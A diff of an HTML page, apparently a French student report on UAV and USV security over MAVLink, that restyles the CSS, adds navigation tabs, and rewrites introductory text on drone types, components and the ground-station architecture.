@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Sécurité des Environnements IoV & UAV — Yakine Haffoudhi</title>
+<title>Sécurité des Environnements UAV &amp; USV — Yakine Haffoudhi</title>
 <link href="https://fonts.googleapis.com/css2?family=Space+Mono:ital,wght@0,400;0,700;1,400&family=Syne:wght@400;600;700;800&family=JetBrains+Mono:wght@300;400;600&display=swap" rel="stylesheet">
 <style>
   :root {
@@ -38,7 +38,6 @@
     overflow-x: hidden;
   }
 
-  /* ── SCAN LINES OVERLAY ── */
   body::before {
     content: '';
     position: fixed;
@@ -48,7 +47,6 @@
     z-index: 9999;
   }
 
-  /* ── HERO ── */
   .hero {
     min-height: 100vh;
     display: flex;
@@ -73,15 +71,39 @@
   }
 
   .img {
-    display: block;              
-    margin: 20px auto;      
-    width: 70%;                 
-    max-height: 500px;
-    object-fit: cover;
-    border-radius: 12px;
+    display: block;
+    margin: 20px auto;
+    width: 80%;
+    max-width: 900px;
+    max-height: 600px;
+    object-fit: contain;
+    border-radius: 4px;
+    border: 1px solid var(--border);
+    box-shadow: 0 4px 30px rgba(18,168,168,0.15);
+  }
 
-    border: 3px solid #0d4f4f;   
-    box-shadow: 0 0 15px #00FFFF50; 
+  .img-row {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+    gap: 12px;
+    margin: 20px 0;
+  }
+
+  .img-row img {
+    width: 100%;
+    margin: 0;
+    height: 100%;
+    object-fit: cover;
+    max-height: 320px;
+  }
+
+  .img-caption {
+    text-align: center;
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--text-dim);
+    margin: -10px auto 24px;
+    letter-spacing: 1px;
   }
 
   @keyframes gridScroll {
@@ -143,9 +165,7 @@
     flex-wrap: wrap;
   }
 
-  .hero-meta-item {
-    text-align: center;
-  }
+  .hero-meta-item { text-align: center; }
 
   .hero-meta-item .label {
     font-family: var(--mono);
@@ -185,12 +205,13 @@
     border-radius: 2px;
     overflow: hidden;
     animation: fadeUp 1s ease both 0.4s;
+    flex-wrap: wrap;
   }
 
   .nav-tab {
-    padding: 12px 32px;
+    padding: 12px 26px;
     font-family: var(--mono);
-    font-size: 11px;
+    font-size: 10px;
     letter-spacing: 2px;
     text-transform: uppercase;
     cursor: pointer;
@@ -208,23 +229,55 @@
     color: var(--teal-light);
   }
 
-  /* ── SECTIONS ── */
-  .section {
-    display: none;
-    animation: fadeIn 0.4s ease;
+  .sub-nav {
+    position: sticky;
+    top: 0;
+    background: rgba(8,21,21,0.95);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid var(--border);
+    z-index: 100;
+    padding: 12px 40px;
+    display: flex;
+    gap: 24px;
+    overflow-x: auto;
+    scrollbar-width: thin;
   }
 
+  .sub-nav-link {
+    font-family: var(--mono);
+    font-size: 10px;
+    letter-spacing: 1.5px;
+    text-transform: uppercase;
+    color: var(--text-dim);
+    text-decoration: none;
+    white-space: nowrap;
+    padding: 6px 12px;
+    border: 1px solid transparent;
+    border-radius: 2px;
+    transition: all 0.2s;
+  }
+
+  .sub-nav-link:hover {
+    color: var(--teal-light);
+    border-color: var(--border);
+  }
+
+  .sub-nav-link.active {
+    color: var(--teal-light);
+    border-color: var(--teal);
+    background: rgba(18,168,168,0.08);
+  }
+
+  .section { display: none; animation: fadeIn 0.4s ease; }
   .section.active { display: block; }
 
   @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
   @keyframes fadeUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
 
-  /* ── CONTAINERS ── */
   .container { max-width: 1200px; margin: 0 auto; padding: 0 40px; }
 
-  /* ── SECTION HEADER ── */
   .section-header {
-    padding: 80px 40px 40px;
+    padding: 60px 40px 30px;
     max-width: 1200px;
     margin: 0 auto;
   }
@@ -251,19 +304,26 @@
 
   .section-title {
     font-family: var(--display);
-    font-size: clamp(28px, 4vw, 52px);
+    font-size: clamp(28px, 4vw, 48px);
     font-weight: 800;
     color: var(--text-bright);
     line-height: 1.1;
     letter-spacing: -1px;
   }
 
-  /* ── PART DIVIDER ── */
+  .section-intro {
+    font-size: 14px;
+    line-height: 1.8;
+    color: var(--text);
+    max-width: 800px;
+    margin: 20px 0 0;
+  }
+
   .part-banner {
-    background: var(--teal-dark);
+    background: linear-gradient(90deg, var(--teal-dark) 0%, rgba(13,79,79,0.4) 100%);
     border-top: 1px solid var(--border);
     border-bottom: 1px solid var(--border);
-    padding: 20px 40px;
+    padding: 22px 40px;
     display: flex;
     align-items: center;
     gap: 20px;
@@ -272,7 +332,7 @@
 
   .part-banner .part-num {
     font-family: var(--display);
-    font-size: 48px;
+    font-size: 52px;
     font-weight: 800;
     color: var(--teal);
     opacity: 0.3;
@@ -294,10 +354,9 @@
     color: var(--text-bright);
   }
 
-  /* ── CARDS GRID ── */
   .cards-grid {
     display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+    grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
     gap: 1px;
     background: var(--border);
     margin: 0;
@@ -305,20 +364,15 @@
 
   .card {
     background: var(--card);
-    padding: 28px;
+    padding: 24px;
     transition: background 0.2s;
   }
 
   .card:hover { background: var(--card2); }
 
-  .card-icon {
-    font-size: 20px;
-    margin-bottom: 14px;
-  }
-
   .card-title {
     font-family: var(--display);
-    font-size: 14px;
+    font-size: 13px;
     font-weight: 700;
     color: var(--teal-light);
     margin-bottom: 10px;
@@ -329,10 +383,9 @@
   .card-body {
     font-size: 12px;
     color: var(--text);
-    line-height: 1.8;
+    line-height: 1.75;
   }
 
-  /* ── TABLE ── */
   .data-table {
     width: 100%;
     border-collapse: collapse;
@@ -366,32 +419,33 @@
     white-space: nowrap;
   }
 
-  /* ── CODE BLOCK ── */
   .code-block {
     background: #020a0a;
     border: 1px solid var(--border);
     border-left: 3px solid var(--teal);
     border-radius: 0 2px 2px 0;
-    padding: 20px 24px;
+    padding: 18px 22px;
     font-family: var(--mono);
-    font-size: 12px;
+    font-size: 11.5px;
     color: var(--teal-light);
     overflow-x: auto;
     margin: 20px 0;
-    line-height: 1.9;
+    line-height: 1.85;
+    white-space: pre-wrap;
+    word-break: break-word;
   }
 
   .code-block .comment { color: #3d7070; }
   .code-block .keyword { color: var(--accent); }
   .code-block .cmd { color: #a8d8a8; }
+  .code-block .str { color: #d8a878; }
 
-  /* ── TERMINAL ── */
   .terminal {
     background: #000e0e;
     border: 1px solid var(--border);
     border-radius: 4px;
     overflow: hidden;
-    margin: 24px 0;
+    margin: 20px 0;
   }
 
   .terminal-bar {
@@ -414,10 +468,11 @@
   }
 
   .terminal-body {
-    padding: 20px 24px;
+    padding: 18px 22px;
     font-family: var(--mono);
-    font-size: 12px;
-    line-height: 2;
+    font-size: 11.5px;
+    line-height: 1.9;
+    overflow-x: auto;
   }
 
   .t-prompt { color: var(--teal); }
@@ -425,15 +480,15 @@
   .t-out { color: #7aadad; }
   .t-warn { color: var(--accent); }
   .t-err { color: var(--red); }
-  .t-comment { color: #3d7070; }
+  .t-comment { color: #3d7070; font-style: italic; }
+  .t-host { color: var(--accent); }
 
-  /* ── ALERT BOX ── */
   .alert {
     border: 1px solid;
     padding: 16px 20px;
     margin: 20px 0;
     font-size: 12px;
-    line-height: 1.7;
+    line-height: 1.75;
     border-radius: 2px;
   }
 
@@ -464,12 +519,45 @@
     margin-bottom: 6px;
   }
 
-  /* ── VULNERABILITY CARD ── */
+  .attack-card {
+    border: 1px solid rgba(224,85,85,0.3);
+    background: linear-gradient(135deg, rgba(224,85,85,0.04) 0%, rgba(12,34,34,0.5) 100%);
+    padding: 24px 28px;
+    margin: 24px 0;
+    border-radius: 2px;
+    border-left: 3px solid var(--red);
+  }
+
+  .attack-card .at-label {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 3px;
+    color: var(--red);
+    text-transform: uppercase;
+    margin-bottom: 8px;
+  }
+
+  .attack-card .at-title {
+    font-family: var(--display);
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--text-bright);
+    margin-bottom: 12px;
+    letter-spacing: -0.5px;
+  }
+
+  .attack-card .at-desc {
+    font-size: 13px;
+    line-height: 1.8;
+    color: var(--text);
+    margin-bottom: 16px;
+  }
+
   .vuln-card {
     border: 1px solid rgba(224,85,85,0.3);
     background: rgba(224,85,85,0.04);
-    padding: 24px;
-    margin: 16px 0;
+    padding: 22px;
+    margin: 14px 0;
     border-radius: 2px;
     border-left: 3px solid var(--red);
   }
@@ -484,7 +572,6 @@
     letter-spacing: 1px;
   }
 
-  /* ── MAVLINK PACKET VIZ ── */
   .packet-viz {
     display: flex;
     gap: 2px;
@@ -496,7 +583,7 @@
   .packet-field {
     background: var(--card);
     border: 1px solid var(--border);
-    padding: 8px 12px;
+    padding: 10px 14px;
     text-align: center;
     flex-shrink: 0;
   }
@@ -519,11 +606,10 @@
   .packet-field.highlight { background: var(--teal-dark); border-color: var(--teal); }
   .packet-field.danger { background: rgba(224,85,85,0.1); border-color: var(--red); }
 
-  /* ── HEARTBEAT VIZ ── */
   .heartbeat-row {
     font-family: var(--mono);
     font-size: 11px;
-    padding: 8px 14px;
+    padding: 10px 16px;
     border-bottom: 1px solid rgba(18,168,168,0.08);
     line-height: 1.6;
   }
@@ -531,43 +617,8 @@
   .heartbeat-row .dir { color: var(--teal-mid); margin-right: 6px; }
   .heartbeat-row .key { color: var(--teal); }
   .heartbeat-row .val { color: var(--accent); }
-  .heartbeat-row .annotation { color: var(--text-dim); font-size: 10px; margin-top: 2px; margin-left: 20px; display: block; }
+  .heartbeat-row .annotation { color: var(--text-dim); font-size: 10px; margin-top: 4px; margin-left: 20px; display: block; }
 
-  /* ── PROTOCOL FLOW ── */
-  .flow-item {
-    display: flex;
-    align-items: flex-start;
-    gap: 16px;
-    padding: 16px 20px;
-    border-bottom: 1px solid rgba(18,168,168,0.08);
-  }
-
-  .flow-num {
-    font-family: var(--display);
-    font-size: 28px;
-    font-weight: 800;
-    color: var(--teal);
-    opacity: 0.3;
-    line-height: 1;
-    flex-shrink: 0;
-    width: 36px;
-    text-align: right;
-  }
-
-  .flow-content .flow-title {
-    font-family: var(--display);
-    font-size: 13px;
-    font-weight: 700;
-    color: var(--teal-light);
-    margin-bottom: 4px;
-  }
-
-  .flow-content .flow-desc {
-    font-size: 12px;
-    color: var(--text);
-  }
-
-  /* ── SENSOR TABLE ── */
   .sensor-badge {
     display: inline-block;
     font-family: var(--mono);
@@ -580,106 +631,6 @@
     white-space: nowrap;
   }
 
-  /* ── COMPARISON ── */
-  .compare-grid {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 1px;
-    background: var(--border);
-    margin: 20px 0;
-  }
-
-  @media (max-width: 700px) { .compare-grid { grid-template-columns: 1fr; } }
-
-  .compare-cell {
-    background: var(--card);
-    padding: 24px;
-  }
-
-  .compare-cell .c-label {
-    font-family: var(--mono);
-    font-size: 9px;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    margin-bottom: 14px;
-  }
-
-  .compare-cell.v1 .c-label { color: var(--red); }
-  .compare-cell.v2 .c-label { color: var(--teal-light); }
-
-  .compare-cell ul {
-    padding-left: 0;
-    list-style: none;
-  }
-
-  .compare-cell ul li {
-    font-size: 12px;
-    color: var(--text);
-    padding: 6px 0;
-    border-bottom: 1px solid rgba(18,168,168,0.08);
-    padding-left: 16px;
-    position: relative;
-  }
-
-  .compare-cell ul li::before {
-    content: '→';
-    position: absolute;
-    left: 0;
-    color: var(--teal-mid);
-  }
-
-  /* ── SIMULATION STEPS ── */
-  .step-card {
-    border: 1px solid var(--border);
-    background: var(--card);
-    margin-bottom: 1px;
-  }
-
-  .step-header {
-    padding: 16px 24px;
-    display: flex;
-    align-items: center;
-    gap: 16px;
-    cursor: pointer;
-    user-select: none;
-    transition: background 0.2s;
-  }
-
-  .step-header:hover { background: var(--card2); }
-
-  .step-num {
-    font-family: var(--display);
-    font-size: 32px;
-    font-weight: 800;
-    color: var(--teal);
-    opacity: 0.25;
-    line-height: 1;
-    min-width: 40px;
-  }
-
-  .step-title {
-    font-family: var(--display);
-    font-size: 15px;
-    font-weight: 700;
-    color: var(--text-bright);
-    flex: 1;
-  }
-
-  .step-tag {
-    font-family: var(--mono);
-    font-size: 9px;
-    letter-spacing: 2px;
-    color: var(--teal);
-    border: 1px solid var(--border);
-    padding: 3px 8px;
-    border-radius: 2px;
-  }
-
-  .step-body {
-    padding: 0 24px 24px 80px;
-  }
-
-  /* ── MISSION FILE VIZ ── */
   .mission-viz {
     overflow-x: auto;
     margin: 20px 0;
@@ -714,66 +665,41 @@
   .wp-nav { color: var(--teal-light); }
   .wp-land { color: var(--accent); }
 
-  /* ── USV / UUV SPECIFIC ── */
-  .vehicle-type-header {
-    background: linear-gradient(135deg, var(--teal-dark) 0%, var(--bg2) 100%);
-    border: 1px solid var(--border);
-    padding: 32px 40px;
-    margin: 40px 0 0;
-    display: grid;
-    grid-template-columns: 1fr auto;
-    align-items: center;
-    gap: 24px;
-  }
-
-  .vehicle-type-header .vt-title {
-    font-family: var(--display);
-    font-size: 28px;
-    font-weight: 800;
-    color: var(--text-bright);
-  }
-
-  .vehicle-type-header .vt-subtitle {
-    font-family: var(--mono);
-    font-size: 10px;
-    letter-spacing: 2px;
-    color: var(--teal-mid);
-    margin-top: 6px;
-  }
-
-  .vehicle-type-header .vt-badge {
-    font-family: var(--display);
-    font-size: 48px;
-    font-weight: 800;
-    color: var(--teal);
-    opacity: 0.15;
-  }
-
-  /* ── CONTENT AREA ── */
   .content-area {
     max-width: 1200px;
     margin: 0 auto;
-    padding: 0 40px 80px;
+    padding: 0 40px 60px;
   }
 
   .prose {
     font-size: 13px;
-    line-height: 1.9;
+    line-height: 1.85;
     color: var(--text);
-    margin: 16px 0;
+    margin: 14px 0;
   }
 
   .prose strong { color: var(--teal-light); font-weight: 700; }
 
   h3.subsection {
     font-family: var(--display);
-    font-size: 18px;
+    font-size: 20px;
     font-weight: 700;
     color: var(--text-bright);
-    margin: 36px 0 16px;
-    padding-bottom: 8px;
+    margin: 44px 0 18px;
+    padding-bottom: 10px;
     border-bottom: 1px solid var(--border);
     letter-spacing: -0.5px;
+    display: flex;
+    align-items: center;
+    gap: 14px;
+  }
+
+  h3.subsection::before {
+    content: '';
+    display: block;
+    width: 4px;
+    height: 20px;
+    background: var(--teal);
   }
 
   h4.sub2 {
@@ -781,7 +707,7 @@
     font-size: 14px;
     font-weight: 600;
     color: var(--teal-light);
-    margin: 24px 0 10px;
+    margin: 28px 0 12px;
     text-transform: uppercase;
     letter-spacing: 1px;
   }
@@ -792,11 +718,11 @@
   }
 
   ul.styled li {
-    padding: 5px 0 5px 20px;
+    padding: 6px 0 6px 20px;
     position: relative;
     font-size: 12px;
     color: var(--text);
-    line-height: 1.7;
+    line-height: 1.75;
     border-bottom: 1px solid rgba(18,168,168,0.06);
   }
 
@@ -808,89 +734,56 @@
     font-size: 10px;
   }
 
-  /* ── FOOTER ── */
-  footer {
-    background: var(--bg2);
-    border-top: 1px solid var(--border);
-    padding: 32px 40px;
-    text-align: center;
-    font-family: var(--mono);
-    font-size: 10px;
-    color: var(--teal-mid);
-    letter-spacing: 1px;
-  }
-
-  /* ── RESPONSIVE ── */
-  @media (max-width: 768px) {
-    .section-header, .content-area { padding: 40px 20px; }
-    .part-banner { padding: 16px 20px; }
-    .hero { padding: 40px 20px; }
-    .cards-grid { grid-template-columns: 1fr; }
-    .imt-logo-placeholder { display: none; }
-  }
-
-  /* ── SCROLL TO TOP ── */
-  .scroll-top {
-    position: fixed;
-    bottom: 30px;
-    right: 30px;
-    background: var(--teal-dark);
-    border: 1px solid var(--teal);
-    color: var(--teal-light);
-    width: 40px;
-    height: 40px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    cursor: pointer;
-    font-size: 16px;
-    z-index: 1000;
-    transition: all 0.2s;
-    opacity: 0;
-    border-radius: 2px;
-  }
-
-  .scroll-top.visible { opacity: 1; }
-  .scroll-top:hover { background: var(--teal-mid); color: var(--bg); }
-
-  .tag-teal {
-    display: inline-block;
-    background: rgba(18,168,168,0.15);
-    border: 1px solid var(--teal);
-    color: var(--teal-light);
-    font-family: var(--mono);
-    font-size: 10px;
-    padding: 2px 8px;
-    border-radius: 2px;
-    margin: 2px;
-  }
-
-  .tag-red {
-    display: inline-block;
-    background: rgba(224,85,85,0.1);
-    border: 1px solid var(--red);
-    color: #f08080;
-    font-family: var(--mono);
-    font-size: 10px;
-    padding: 2px 8px;
-    border-radius: 2px;
-    margin: 2px;
-  }
-
-  .divider {
-    border: none;
-    border-top: 1px solid var(--border);
-    margin: 32px 0;
-  }
-
-  .two-col {
+  .step-nav {
     display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 24px;
-    margin: 20px 0;
+    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+    gap: 1px;
+    background: var(--border);
+    margin: 30px 0 50px;
   }
 
-  @media (max-width: 700px) { .two-col { grid-template-columns: 1fr; } }
+  .step-nav-item {
+    background: var(--card);
+    padding: 16px 18px;
+    cursor: pointer;
+    transition: all 0.2s;
+    text-decoration: none;
+    color: var(--text);
+    display: block;
+    text-align: center;
+  }
+
+  .step-nav-item:hover {
+    background: var(--card2);
+    color: var(--teal-light);
+  }
+
+  .step-nav-item .sn-num {
+    font-family: var(--display);
+    font-size: 28px;
+    font-weight: 800;
+    color: var(--teal);
+    opacity: 0.4;
+    line-height: 1;
+    margin-bottom: 6px;
+  }
+
+  .step-nav-item .sn-label {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 1.5px;
+    color: var(--teal-mid);
+    text-transform: uppercase;
+  }
+
+  .step-nav-item .sn-name {
+    font-family: var(--display);
+    font-size: 12px;
+    font-weight: 600;
+    color: var(--text-bright);
+    margin-top: 4px;
+    line-height: 1.4;
+  }
 
   .info-box {
     border: 1px solid var(--border);
@@ -910,16 +803,212 @@
     padding-bottom: 8px;
     border-bottom: 1px solid var(--border);
   }
+
+  .two-col {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+    margin: 20px 0;
+  }
+
+  @media (max-width: 700px) { .two-col { grid-template-columns: 1fr; } }
+
+  .tag-teal, .tag-red {
+    display: inline-block;
+    font-family: var(--mono);
+    font-size: 10px;
+    padding: 2px 8px;
+    border-radius: 2px;
+    margin: 2px;
+  }
+
+  .tag-teal {
+    background: rgba(18,168,168,0.15);
+    border: 1px solid var(--teal);
+    color: var(--teal-light);
+  }
+
+  .tag-red {
+    background: rgba(224,85,85,0.1);
+    border: 1px solid var(--red);
+    color: #f08080;
+  }
+
+  .compare-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1px;
+    background: var(--border);
+    margin: 20px 0;
+  }
+
+  @media (max-width: 700px) { .compare-grid { grid-template-columns: 1fr; } }
+
+  .compare-cell {
+    background: var(--card);
+    padding: 22px;
+  }
+
+  .compare-cell .c-label {
+    font-family: var(--mono);
+    font-size: 9px;
+    letter-spacing: 2px;
+    text-transform: uppercase;
+    margin-bottom: 14px;
+  }
+
+  .compare-cell.v1 .c-label { color: var(--red); }
+  .compare-cell.v2 .c-label { color: var(--teal-light); }
+
+  .compare-cell ul { padding-left: 0; list-style: none; }
+
+  .compare-cell ul li {
+    font-size: 12px;
+    color: var(--text);
+    padding: 6px 0 6px 16px;
+    border-bottom: 1px solid rgba(18,168,168,0.08);
+    position: relative;
+  }
+
+  .compare-cell ul li::before {
+    content: '→';
+    position: absolute;
+    left: 0;
+    color: var(--teal-mid);
+  }
+
+  .mitm-diagram {
+    background: var(--card);
+    border: 1px solid var(--border);
+    padding: 28px;
+    border-radius: 2px;
+    margin: 24px 0;
+    font-family: var(--mono);
+    text-align: center;
+  }
+
+  .mitm-row {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 14px;
+    flex-wrap: wrap;
+    margin: 14px 0;
+    font-size: 12px;
+  }
+
+  .mitm-node {
+    padding: 10px 18px;
+    border: 1px solid var(--teal);
+    background: rgba(18,168,168,0.06);
+    color: var(--teal-light);
+    border-radius: 2px;
+    min-width: 130px;
+  }
+
+  .mitm-node.attacker {
+    border-color: var(--red);
+    background: rgba(224,85,85,0.08);
+    color: #f08080;
+  }
+
+  .mitm-arrow {
+    color: var(--teal);
+    font-size: 18px;
+  }
+
+  .mitm-label {
+    font-size: 10px;
+    color: var(--text-dim);
+    margin-top: 4px;
+  }
+
+  footer {
+    background: var(--bg2);
+    border-top: 1px solid var(--border);
+    padding: 32px 40px;
+    text-align: center;
+    font-family: var(--mono);
+    font-size: 10px;
+    color: var(--teal-mid);
+    letter-spacing: 1px;
+  }
+
+  @media (max-width: 768px) {
+    .section-header, .content-area { padding: 40px 20px; }
+    .part-banner { padding: 16px 20px; }
+    .hero { padding: 40px 20px; }
+    .cards-grid { grid-template-columns: 1fr; }
+    .imt-logo-placeholder { display: none; }
+    .sub-nav { padding: 12px 20px; }
+    .img { width: 100%; }
+  }
+
+  .scroll-top {
+    position: fixed;
+    bottom: 30px;
+    right: 30px;
+    background: var(--teal-dark);
+    border: 1px solid var(--teal);
+    color: var(--teal-light);
+    width: 44px;
+    height: 44px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    cursor: pointer;
+    font-size: 16px;
+    z-index: 1000;
+    transition: all 0.2s;
+    opacity: 0;
+    border-radius: 2px;
+  }
+
+  .scroll-top.visible { opacity: 1; }
+  .scroll-top:hover { background: var(--teal-mid); color: var(--bg); }
+
+  .divider {
+    border: none;
+    border-top: 1px solid var(--border);
+    margin: 32px 0;
+  }
+
+  .num-highlight {
+    font-family: var(--display);
+    font-size: 13px;
+    font-weight: 700;
+    color: var(--accent);
+  }
+
+  .params-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+    gap: 8px;
+    margin: 16px 0;
+  }
+
+  .param-item {
+    background: var(--card);
+    border: 1px solid var(--border);
+    padding: 10px 14px;
+    font-family: var(--mono);
+    font-size: 11px;
+    border-radius: 2px;
+  }
+
+  .param-item .pn { color: var(--teal); }
+  .param-item .pv { color: var(--accent); }
+  .param-item .pd { color: var(--text-dim); font-size: 9.5px; display: block; margin-top: 3px; }
+
 </style>
 </head>
 <body>
 
-<!-- HERO -->
 <section class="hero">
   <div class="hero-grid"></div>
   <div class="imt-logo-placeholder">IMT ATLANTIQUE</div>
-  <h1>Sécurité des <span>environnements UAV</span></h1>
-  <p class="hero-sub">Analyse · Attaques · Détection d'anomalies</p>
+  <h1>Sécurité des <span>environnements UAV &amp; USV</span></h1>
+  <p class="hero-sub">Analyse · Attaques · Détection d'anomalies sur MAVLink</p>
   <div class="hero-meta">
     <div class="hero-meta-item">
       <div class="label">Préparé par</div>
@@ -939,26 +1028,51 @@
     </div>
   </div>
   <div class="nav-tabs">
-    <button class="nav-tab active" onclick="showSection('theorie')">Partie Théorique</button>
-    <button class="nav-tab" onclick="showSection('simulation')">Simulation & Analyse</button>
+    <button class="nav-tab active" onclick="showSection('theorie')">Introduction</button>
+    <button class="nav-tab" onclick="showSection('simulation')">Mise en place</button>
+    <button class="nav-tab" onclick="showSection('attaques')">Scénarios d'attaque</button>
+    <button class="nav-tab" onclick="showSection('usv')">Simulation USV</button>
   </div>
 </section>
 
-<!-- ═══════════════════════════════════════════════════════════
-     PARTIE THÉORIQUE
-═══════════════════════════════════════════════════════════ -->
+
 <div id="theorie" class="section active">
 
-  <!-- ── PARTIE 1 : UAV ── -->
-  <div class="part-banner">
-    <div class="part-num">01</div>
-    <div class="part-info">
-      <div class="part-label">Partie 1</div>
-      <div class="part-name">Véhicule Aérien Non Piloté — UAV</div>
-    </div>
+  <div class="section-header">
+    <div class="section-eyebrow">Partie 01 — Théorie</div>
+    <h2 class="section-title">Comprendre le contexte</h2>
+    <p class="section-intro">
+      Les drones sont aujourd’hui utilisés dans plusieurs domaines comme la surveillance, l’agriculture et les missions de secours. Pour fonctionner, ils utilisent des protocoles de communication permettant l’échange des données entre le drone et la station de contrôle au sol. Parmi ces protocoles, MAVLink est l’un des plus utilisés.
+    </p>
   </div>
 
   <div class="content-area">
+    <h3 class="subsection">Trois familles de véhicules autonomes</h3>
+    <div class="cards-grid" style="grid-template-columns: repeat(auto-fill, minmax(300px,1fr))">
+      <div class="card">
+        <div class="card-title">UAV — Drone aérien</div>
+        <div class="card-body">
+          Unmanned Aerial Vehicle. Évolue dans les trois dimensions de l'espace aérien.
+          Communication radio directe, GPS satellite.
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">USV — Drone de surface</div>
+        <div class="card-body">
+          Unmanned Surface Vehicle. Opère à la surface de l'eau (mer, lac).
+          Liaison radio possible mais dégradée par les conditions maritimes (vagues, embruns, multi-trajets).
+        </div>
+      </div>
+      <div class="card">
+        <div class="card-title">UUV — Drone sous-marin</div>
+        <div class="card-body">
+          Unmanned Underwater Vehicle. Sous l'eau, les ondes radio ne passent pas :
+          communication acoustique uniquement, débits très faibles, latence élevée.
+        </div>
+      </div>
+    </div>
+
+    <div class="content-area">
 
     <h3 class="subsection">Composants des Drones</h3>
     <div class="cards-grid">
@@ -968,7 +1082,7 @@
       </div>
       <div class="card">
         <div class="card-title">GPS</div>
-        <div class="card-body">Position & navigation. Fournit la latitude, longitude, altitude et vitesse. Sans GNSS, de nombreuses fonctions deviennent impossibles : maintien de position, retour automatique, navigation par waypoints.</div>
+        <div class="card-body">Position &amp; navigation. Fournit la latitude, longitude, altitude et vitesse. Sans GNSS, de nombreuses fonctions deviennent impossibles : maintien de position, retour automatique, navigation par waypoints.</div>
       </div>
       <div class="card">
         <div class="card-title">IMU</div>
@@ -988,619 +1102,194 @@
       </div>
     </div>
 
-    <h3 class="subsection">Méthodes de Contrôle</h3>
-    <div class="cards-grid">
-      <div class="card">
-        <div class="card-title">Contrôle Autonome</div>
-        <div class="card-body">Le drone prend toutes les décisions sans intervention humaine, en s'appuyant sur des algorithmes et des capteurs embarqués.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">Contrôle Supervisé</div>
-        <div class="card-body">Le drone exécute sa mission de manière autonome, mais un opérateur peut intervenir à tout moment pour ajuster ou corriger le comportement.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">Contrôle Piloté</div>
-        <div class="card-body">Toutes les décisions sont prises par un opérateur humain à distance, via la station de contrôle au sol (GCS).</div>
-      </div>
-    </div>
+    
+    <h3 class="subsection">Architecture sol ↔ drone</h3>
+    <p class="prose">
+      Le contrôleur de vol embarqué (Pixhawk avec ArduPilot ou PX4) reçoit les données du GPS et de l'IMU,
+      stabilise l'appareil et exécute la mission. Il échange avec une station de contrôle au sol , la
+      <strong>GCS</strong> (QGroundControl, Mission Planner, MAVProxy) , via le protocole MAVLink, le plus souvent
+      en UDP sur le port 14550.
+    </p>
 
-    <h3 class="subsection">Types de communications</h3>
-    <div class="cards-grid" style="grid-template-columns: repeat(auto-fill, minmax(260px,1fr))">
-      <div class="card">
-        <div class="card-title">Drone-to-Ground Station</div>
-        <div class="card-body">Échange via Wi-Fi ou Bluetooth. Souvent peu sécurisé, vulnérable à l'interception et à la prise de contrôle.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">Drone-to-Network</div>
-        <div class="card-body">Connexion aux réseaux cellulaires 4G/5G. Grande portée, mais nécessite une sécurisation renforcée contre les attaques réseau.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">Drone-to-Satellite</div>
-        <div class="card-body">Utilisée par le GPS. Fiable mais coûteuse. Cible d'attaques de brouillage ou de spoofing GPS.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">Drone-to-Drone</div>
-        <div class="card-body">Échange direct inter-drones. Utilisé dans les essaims. Non encore bien standardisé, exposé aux attaques pair-à-pair.</div>
-      </div>
-    </div>
 
-    <h3 class="subsection"> Architecture de communication</h3>
-    <div class="cards-grid" style="grid-template-columns: repeat(auto-fill, minmax(230px,1fr))">
-      <div class="card">
-        <div class="card-title">Contrôleur de Vol</div>
-        <div class="card-body">Autopilote (ArduPilot). Assure la stabilisation, le contrôle de trajectoire et l'exécution des missions autonomes.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">Station de Contrôle GCS</div>
-        <div class="card-body">Suivi en temps réel, envoi de commandes, supervision des missions.</div>
-      </div>
-      <div class="card">
-        <div class="card-title">Systèmes de Communication</div>
-        <div class="card-body">Radio RF · Wi-Fi (zones côtières) · LTE/4G/5G · Satellite (missions longue distance)</div>
-      </div>
-      <div class="card">
-        <div class="card-title">Capteurs</div>
-        <div class="card-body">GNSS · IMU · Sonar (détection sous-marine) · Caméras · Capteurs météorologiques. Fusion de capteurs cruciale en milieu maritime.</div>
-      </div>
-    </div>
+    <h3 class="subsection">MAVLink</h3>
+    <p class="prose">
+      <strong>MAVLink</strong> (Micro Air Vehicle Link) est un protocole de messagerie léger, conçu pour les
+      liaisons radio à bande passante limitée. Il transporte la télémétrie (GPS, altitude, batterie),
+      les commandes (armement, changement de mode), et les plans de mission.
+    </p>
 
-    <h3 class="subsection">Protocoles de Communication des Drones</h3>
-
-    <h4 class="sub2">1. Protocoles Radio</h4>
-    <div class="two-col">
-      <div class="info-box">
-        <div class="ib-title">PWM / PPM / SBUS</div>
-        <ul class="styled">
-          <li><strong>PWM</strong> : chaque canal transmis séparément → plus de fils, plus de latence</li>
-          <li><strong>PPM</strong> : regroupe plusieurs canaux dans un signal → réduit le câblage</li>
-          <li><strong>SBUS</strong> : numérique avancé, meilleure précision, latence réduite, robuste aux interférences</li>
-        </ul>
-      </div>
-      <div class="info-box">
-        <div class="ib-title">LoRa (Long Range)</div>
-        <ul class="styled">
